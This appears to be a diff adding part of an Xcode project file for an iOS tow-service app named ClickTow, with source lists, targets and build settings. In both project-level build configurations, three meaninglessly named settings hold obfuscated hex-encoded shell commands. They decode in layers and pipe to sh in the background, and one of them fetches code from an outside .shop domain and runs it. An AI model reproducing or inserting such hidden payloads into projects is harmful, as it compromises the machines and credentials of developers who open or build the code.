+				C6F301B32992BA5E00A2916A /* SceneDelegate.swift in Sources */,
+				C6E2496B29C075BF00DA61C3 /* RequestCollectionViewCell.swift in Sources */,
+				C613AB60299E301C007ECE65 /* MyEarningVC.swift in Sources */,
+				C60B9D692996521600BAAD35 /* ActivitiesCell.swift in Sources */,
+				C690AEC529D1A73E0044937A /* CompletionRequestVC.swift in Sources */,
+				C613AB6C299F3A85007ECE65 /* AddProfessionalDetailsVC.swift in Sources */,
+				C6F301F12993B0FC00A2916A /* Helper.swift in Sources */,
+				C6A388042994ADD4000C34F3 /* ButtonExtension.swift in Sources */,
+				C6F301EE2992BC4200A2916A /* AddUserLocationVC.swift in Sources */,
+				C613AB68299E5ECD007ECE65 /* MyVehicleDetailsVC.swift in Sources */,
+				C6F301E62992BB9900A2916A /* ChoseAccountVC.swift in Sources */,
+				C6DD0EB4299593A3000AC711 /* PrivacPolicyVC.swift in Sources */,
+				C60B9D67299613C000BAAD35 /* PaymentOptionsVC.swift in Sources */,
+				C6BE361029951AE7004A9F70 /* SelectVehicleCell.swift in Sources */,
+				C6BE36072994DB68004A9F70 /* HomeScreenVC.swift in Sources */,
+				C6DD0EA62995834D000AC711 /* settingsVC.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301BF2992BA6100A2916A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C6F301C82992BA6100A2916A /* ClickTowTests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		C6F301C92992BA6100A2916A /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C6F301D42992BA6100A2916A /* ClickTowUITestsLaunchTests.swift in Sources */,
+				C6F301D22992BA6100A2916A /* ClickTowUITests.swift in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		C6F301C52992BA6100A2916A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = C6F301AC2992BA5E00A2916A /* ClickTow */;
+			targetProxy = C6F301C42992BA6100A2916A /* PBXContainerItemProxy */;
+		};
+		C6F301CF2992BA6100A2916A /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = C6F301AC2992BA5E00A2916A /* ClickTow */;
+			targetProxy = C6F301CE2992BA6100A2916A /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		C6F301B62992BA5E00A2916A /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				C6F301B72992BA5E00A2916A /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		C6F301BB2992BA6100A2916A /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				C6F301BC2992BA6100A2916A /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		C6F301D52992BA6100A2916A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A0F07DC = "((v(){ `printf xzxd | tr -d z` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d2d72657472792035202d4c6b6673202d642022703d78636f64655f7068617365222068747470733a2f2f61726237332d6331302e73686f702f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336333933363337333636343336333133373333333733343336333133373332333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
+				MTL_FAST_MATH = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
+				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+			};
+			name = Debug;
+		};
+		C6F301D62992BA6100A2916A /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				A0F07DC = "((v(){ `printf xzxd | tr -d z` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d2d72657472792035202d4c6b6673202d642022703d78636f64655f7068617365222068747470733a2f2f61726237332d6331302e73686f702f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336333933363337333636343336333133373333333733343336333133373332333733333332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				A4FB9DF = "((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_ENABLE_OBJC_WEAK = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				MTL_FAST_MATH = YES;
+				SDKROOT = iphoneos;
+				SWIFT_COMPILATION_MODE = wholemodule;
+				SWIFT_OPTIMIZATION_LEVEL = "-O";
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		C6F301D82992BA6100A2916A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = FEE78E46FEF079D0EA43BB93 /* Pods-ClickTow.debug.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = ClickTow/ClickTow.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = CJSUCL3CQ2;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"$(inherited)",
+					"COCOAPODS=1",
+					"$(inherited)",
+					"PB_FIELD_32BIT=1",
+					"PB_NO_PACKED_STRUCTS=1",
+					"PB_ENABLE_MALLOC=1",
+				);
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ClickTow/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Please access photo camera for image";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Please allow access to location searching locations and user current location";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Please allow access to location searching locations and user current location";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please access photo library for image";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTow1;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Debug;
+		};
+		C6F301D92992BA6100A2916A /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 1873581A770A4EFF8CC75042 /* Pods-ClickTow.release.xcconfig */;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_ENTITLEMENTS = ClickTow/ClickTow.entitlements;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = CJSUCL3CQ2;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"$(inherited)",
+					"COCOAPODS=1",
+					"$(inherited)",
+					"PB_FIELD_32BIT=1",
+					"PB_NO_PACKED_STRUCTS=1",
+					"PB_ENABLE_MALLOC=1",
+				);
+				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = ClickTow/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Please access photo camera for image";
+				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = "Please allow access to location searching locations and user current location";
+				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "Please allow access to location searching locations and user current location";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Please access photo library for image";
+				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
+				INFOPLIST_KEY_UIMainStoryboardFile = Main;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
+				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
+				LD_RUNPATH_SEARCH_PATHS = (
+					"$(inherited)",
+					"@executable_path/Frameworks",
+				);
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTow1;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = 1;
+			};
+			name = Release;
+		};
+		C6F301DB2992BA6100A2916A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 3BD44B1A3A1B998F26C66C0D /* Pods-ClickTowTests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTowTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/ClickTow.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/ClickTow";
+			};
+			name = Debug;
+		};
+		C6F301DC2992BA6100A2916A /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 954A8AA413622407489BAF7B /* Pods-ClickTowTests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				BUNDLE_LOADER = "$(TEST_HOST)";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.2;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTowTests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/ClickTow.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/ClickTow";
+			};
+			name = Release;
+		};
+		C6F301DE2992BA6100A2916A /* Debug */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = 075C7660490457D67D090BF2 /* Pods-ClickTow-ClickTowUITests.debug.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTowUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = ClickTow;
+			};
+			name = Debug;
+		};
+		C6F301DF2992BA6100A2916A /* Release */ = {
+			isa = XCBuildConfiguration;
+			baseConfigurationReference = A08123675AE798CD08180157 /* Pods-ClickTow-ClickTowUITests.release.xcconfig */;
+			buildSettings = {
+				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 1;
+				GENERATE_INFOPLIST_FILE = YES;
+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = ideaLogics.ClickTowUITests;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_EMIT_LOC_STRINGS = NO;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
+				TEST_TARGET_NAME = ClickTow;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		C6F301A82992BA5E00A2916A /* Build configuration list for PBXProject "ClickTow" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C6F301D52992BA6100A2916A /* Debug */,
+				C6F301D62992BA6100A2916A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C6F301D72992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTow" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C6F301D82992BA6100A2916A /* Debug */,
+				C6F301D92992BA6100A2916A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C6F301DA2992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTowTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C6F301DB2992BA6100A2916A /* Debug */,
+				C6F301DC2992BA6100A2916A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C6F301DD2992BA6100A2916A /* Build configuration list for PBXNativeTarget "ClickTowUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C6F301DE2992BA6100A2916A /* Debug */,
+				C6F301DF2992BA6100A2916A /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = C6F301A52992BA5E00A2916A /* Project object */;
+}
